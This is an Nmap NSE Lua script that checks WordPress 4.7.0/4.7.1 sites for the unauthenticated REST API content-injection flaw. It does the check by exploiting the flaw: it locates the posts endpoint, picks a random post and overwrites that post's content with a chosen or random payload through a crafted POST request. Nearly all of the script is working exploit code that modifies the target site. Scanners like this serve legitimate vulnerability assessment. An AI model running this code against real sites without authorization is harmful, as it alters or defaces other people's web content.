local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local http = require "http"
local nmap = require "nmap"
local json = require "json"

description =  [[
Determines if the WordPress site is vulnerable to an unauthenticated content injection vulnerability.

Unpatched versions of WordPress versions 4.7.0 and 4.7.1 allow unauthenticated users to inject arbitrary content via the REST API. Malicious users can exploit this to modify the contents of any post or page within a vulnerable WordPress site.
]]

---
-- @usage nmap --script http-vuln-wordpress-content-injection <target>
-- @usage nmap --script http-vuln-wordpress-content-injection --script-args http-vuln-wordpress-content-injection.path=/path, http-vuln-wordpress-content-injection.payload="Injected Content" <target>
--
-- @args http-vuln-wordpress-content-injection.path Path to URI. Default: /
-- @args http-vuln-wordpress-content-injection.payload Payload to inject. Default: a random numeric string
--
-- @output
-- 80/tcp open  http
--| http-vuln-wordpress-content-injection: 
--|   VULNERABLE:
--|   WordPress 4.7.0/4.7.1 - Unauthenticated Content Injection
--|     State: VULNERABLE (Exploitable)
--|       Unpatched versions of WordPress versions 4.7.0 and 4.7.1 allow unauthenticated users to inject arbitrary content via the REST API. Malicious users can exploit this to modify the contents of any post or page within a vulnerable WordPress site.
--|     Disclosure date: 2017-02-01
--|     Exploit results:
--|       http://localhost/wordpress/?p=6
--|     Extra information:
--|       This issue was patched in version 4.7.2.
--|     References:
--|_      https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
--
-- @xmloutput
-- <elem key="title">WordPress 4.7.0/4.7.1 - Unauthenticated Content Injection</elem>
-- <elem key="state">VULNERABLE (Exploitable)</elem>
-- <table key="description">
-- <elem>Unpatched versions of WordPress versions 4.7.0 and 4.7.1 allow unauthenticated users to inject arbitrary content via the REST API. Malicious users can exploit this to modify the contents of any post or page within a vulnerable WordPress site.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2017</elem>
-- <elem key="month">02</elem>
-- <elem key="day">01</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2017-02-01</elem>
-- <table key="exploit_results">
-- <elem>http://localhost/wordpress/?p=6</elem>
-- </table>
-- <table key="extra_info">
-- <elem>This issue was patched in version 4.7.2.</elem>
-- </table>
-- <table key="refs">
-- <elem>https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html</elem>
-- </table>
---

author = "Josh Amishav-Zlatin"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "exploit" }

portrule = shortport.http

local function LocateAPI(host, port, path)
  local res = http.head(host, port, path)
  local link = res.header['link']:gsub("<.-//.-/(.-)>;.*","/%1wp/v2/posts")
  stdnse.debug1("Link: %s", link)
  return link
end

local function ChooseRandomPost(host, port, link)
  local res1 = http.get(host, port, link)
  stdnse.debug1("Res1: %s", res1.body)
  local status, parsed = json.parse(res1.body)
  if status then
    for i=1,#parsed do
      stdnse.verbose1("Post ID: %d, Title: %s, Link: %s", parsed[i].id, parsed[i].title.rendered, parsed[i].link) 
    end
  end
  return parsed[math.random(#parsed)].id
end

local function InjectContent(host, port, api, postid, payload)
  local postdata = '{"content": "' .. payload .. '"}'
  uri = api .. "/" .. postid .. "/?id=" .. postid .. "abc"
  stdnse.debug1("URI: %s", uri)
  local options = {
    header = {
      ["Content-Type"] = "application/json",
    },
  }
  stdnse.debug1("Payload: %s", payload)
  local response = http.post( host, port, uri, options, nil, postdata)
  local icstatus, icparsed
  if response.status == 200 then
    if response.body:find(payload) then
      icstatus, icparsed = json.parse(response.body)
      if icstatus then
        stdnse.debug1("JSONURI: %s", icparsed.guid.raw)
      end
    end
  end
  return icparsed.guid.raw
end

action = function(host, port)
  local output = stdnse.output_table()
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path") or "/"
  local API = LocateAPI(host, port, path)
  local PostID, Payload
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'WordPress 4.7.0/4.7.1 - Unauthenticated Content Injection',
    state = vulns.STATE.NOT_VULN,
    description = [[
Unpatched versions of WordPress versions 4.7.0 and 4.7.1 allow unauthenticated users to inject arbitrary content via the REST API. Malicious users can exploit this to modify the contents of any post or page within a vulnerable WordPress site.]], 
    references = {
      'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html',
    },
    dates = {
      disclosure = {year = '2017', month = '02', day = '01'},
    },
    extra_info = "This issue was patched in version 4.7.2."
  }
  if stdnse.get_script_args(SCRIPT_NAME .. ".id") then
    PostID = stdnse.get_script_args(SCRIPT_NAME .. ".id")
  else
    PostID = ChooseRandomPost(host, port, API)
  end
  if stdnse.get_script_args(SCRIPT_NAME .. ".payload") then
    Payload = stdnse.get_script_args(SCRIPT_NAME .. ".payload")
  else
    Payload = stdnse.generate_random_string(math.random(50), "0123456789 abcdefghijklmnoprstuvzxwyABCDEFGHIJKLMNOPRSTUVZXWY")
  end
  stdnse.verbose1("Random PostID: %d", PostID)
  local VulnStatus = InjectContent(host, port, API, PostID, Payload)
  if VulnStatus then
    vuln.state = vulns.STATE.EXPLOIT
    vuln.exploit_results = VulnStatus
    return vuln_report:make_output(vuln)
  end
end
